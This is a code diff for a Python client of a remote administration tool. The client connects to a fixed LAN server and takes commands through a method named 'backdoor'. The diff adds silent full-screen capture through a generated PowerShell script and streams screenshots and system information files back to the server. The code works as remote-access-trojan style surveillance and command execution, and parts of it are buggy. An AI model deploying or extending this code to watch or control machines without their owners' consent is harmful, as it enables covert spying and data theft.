@@ -1,6 +1,5 @@
 from datetime import datetime
 from threading import Thread
-from PIL import ImageGrab
 import subprocess
 import threading
 import random
@@ -11,7 +10,8 @@ import time
 import sys
 import os
 
-# DONE: Modified cmd command function.
+# DONE: Fixes Screenshot file receive
+# TODO: Fix systeminfo file receive
 
 
 class Client:
@@ -28,6 +28,29 @@ class Client:
         if not os.path.exists(f'{self.main_path}'):
             os.makedirs(self.main_path)
 
+    def sc_conn(self, path, filename):
+        try:
+            sc_soc.send(f"{filename}".encode())
+            msg = soc.recv(1024).decode()
+            print(msg)
+
+            chunk = 40960000
+            sc = open(filename, 'rb')
+            while True:
+                data = sc.read(chunk)
+                if not data:
+                    break
+
+                sc_soc.sendall(data)
+
+            sc.close()
+            # sc_soc.close()
+
+            return True
+
+        except (ConnectionResetError, ConnectionError, ConnectionAbortedError, ConnectionRefusedError):
+            return False
+
     def connection(self):
         soc = socket.socket()
         soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -37,7 +60,6 @@ class Client:
             # print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
             try:
                 soc.connect((self.server_host, self.server_port))
-                self.backdoor(soc)
 
             except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                 # print(colored(e, 'red'))
@@ -50,22 +72,21 @@ class Client:
 
         return
 
-    def run_powershell(self, cmd):
-        return subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    def convert_to_bytes(self, no):
+        result = bytearray()
+        result.append(no & 255)
+        for i in range(3):
+            no = no >> 8
+            result.append(no & 255)
+        return result
 
-    def run_cmd(self, cmd):
-        self.d = datetime.now()
-        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
-        cmd_file = rf"c:\MekifRemoteAdmin\cmd {self.hostname} {str(self.localIP)} {dt}.txt"
-        if not os.path.isfile(cmd_file):
-            with open(cmd_file, 'w') as file:
-                subprocess.run(cmd, capture_output=True, stdout=file)
-
-        else:
-            with open(cmd_file, 'a') as file:
-                subprocess.run(cmd, capture_output=True, stdout=file)
-
-        return
+    def bytes_to_number(self, b):
+        # if Python2.x
+        # b = map(ord, b)
+        res = 0
+        for i in range(4):
+            res += b[i] << (i * 8)
+        return res
 
     def backdoor(self, soc):
         # Send Computer Name to Server
@@ -99,28 +120,6 @@ class Client:
                     except ConnectionResetError:
                         break
 
-                # Radix
-                elif str(command).lower() == "radix":
-                    r = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
-                    r.wait()
-                    msg = r.returncode
-                    if msg is None:
-                        msg = 'Command Successful.'
-                        try:
-                            soc.send(f'{msg}'.encode())
-
-                        except ConnectionResetError:
-                            break
-
-                    else:
-                        msg = "Command Error."
-                        try:
-                            soc.send(msg.encode())
-                            break
-
-                        except ConnectionResetError:
-                            break
-
                 # Capture Screenshot
                 elif str(command.lower()[:6]) == "screen":
                     self.d = datetime.now().replace(microsecond=0)
@@ -128,26 +127,51 @@ class Client:
                     self.fulldt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                     self.filename = \
                         rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {self.fulldt}.jpg"
-                    snap = ImageGrab.grab()
-                    snap.save(self.filename)
+                    self.chunk = 40960000
+                    self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
+                    with open(self.path, 'w') as file:
+                        file.write("Add-Type -AssemblyName System.Windows.Forms\n")
+                        file.write("Add-Type -AssemblyName System.Drawing\n\n")
+                        file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
+                        file.write("$Width  = $Screen.Width\n")
+                        file.write("$Height = $Screen.Height\n")
+                        file.write("$Left = $Screen.Left\n")
+                        file.write("$Top = $Screen.Top\n\n")
+                        file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
+                        file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
+                        file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
+                        file.write(rf"$bitmap.Save('{self.filename}')")
 
                     time.sleep(0.2)
-                    try:
-                        soc.send(f"{self.filename}".encode())
-                        msg = soc.recv(1024).decode()
 
-                        # self.send_files(soc)
-                        chunk = 40960000
-                        sysinfo = open(self.filename, 'rb')
-                        # print(msg)
-                        data = sysinfo.read(chunk)
-                        soc.sendall(data)
-                        sysinfo.close()
-                        msg = soc.recv(1024).decode()
+                    ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
+                    ps.communicate()
+                    # self.sc_conn(self.path, self.filename)
+                    try:
+                        # Send filename to server
+                        soc.send(f"{self.filename}".encode())
+
+                        # Receive filename Confirmation from the server
+                        msg = soc.recv(self.chunk).decode()
                         print(f"@Server: {msg}")
-                        # soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
+                        length = os.path.getsize(self.filename)
+                        print(f"SC Size: {length}")
+                        soc.send(self.convert_to_bytes(length))
+
+                        # Send file content
+                        with open(self.filename, 'rb') as img_file:
+                            img_data = img_file.read(1024)
+                            while img_data:
+                                soc.send(img_data)
+                                if not img_data:
+                                    break
+
+                                img_data = img_file.read(1024)
+
+                        # Send Confirmation to server
+                        soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
                         os.remove(self.filename)
-                        os.remove(path)
+                        os.remove(self.path)
 
                     except ConnectionResetError:
                         break
@@ -174,25 +198,30 @@ class Client:
                         break
 
                     time.sleep(2)
-                    sysinfo = open(self.sifile, 'r')
-                    try:
-                        while True:
-                            data = sysinfo.read(chunk)
-                            soc.sendall(data.encode())
+                    length = os.path.getsize(self.sifile)
+                    print(f"SysInfoFile Size: {length}")
+                    soc.send(self.convert_to_bytes(length))
 
-                            if not data:
-                                sysinfo.close()
-                                break
+                    # sysinfo = open(self.sifile, 'r')
+                    try:
+                        with open(self.sifile, 'rb') as sy_file:
+                            sys_data = sy_file.read(1024)
+                            while sys_data:
+                                soc.send(sys_data)
+                                if not sys_data:
+                                    break
+
+                                sys_data = sy_file.read(1024)
 
                         msg = soc.recv(1024).decode()
-                        # print(f"@Server: {msg}")
+                        print(f"@Server: {msg}")
                         soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
-                        os.remove(self.sifile)
 
-                        continue
-
-                    except ConnectionResetError:
+                    except socket.error:
                         break
+
+                    os.remove(self.sifile)
+                    continue
 
                 # Get Last Restart Time
                 elif str(command).lower()[:2] == "lr":
@@ -299,15 +328,57 @@ class Client:
         self.connection()
 
 
+def run_powershell(cmd):
+    return subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+
+
+def run_cmd(cmd):
+    return subprocess.run(cmd, capture_output=True)
+
+
+def check_file_path(pat, subpat=None, file=None):
+    if subpat is None:
+        pass
+
+    if os.path.exists(pat):
+        if not subpat:
+            newfile = os.path.join(pat, file)
+            print(newfile)
+
+            return newfile
+
+        elif not file:
+            return False
+
+    else:
+        os.makedirs(pat)
+        if not subpat:
+            newfile = os.path.join(pat, file)
+            return newfile
+
+        else:
+            newpath = os.path.join(pat, subpat)
+            newfile = os.path.join(newpath, file)
+
+        return newfile
+
+
 if __name__ == "__main__":
     task_list = []
     mekif_path = r'c:\MekifRemoteAdmin'
-    port = 55400
-    servers = [('192.168.1.50', port)]
+    servers = [('192.168.1.10', 55400)]
+    soc = socket.socket()
+    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     # Start Client
     while True:
         for server in servers:
             client = Client(server, mekif_path)
-            client.connection()
+            time.sleep(1)
+            try:
+                soc.connect(server)
 
+            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
+                # print(colored(e, 'red'))
+                continue
+            client.backdoor(soc)
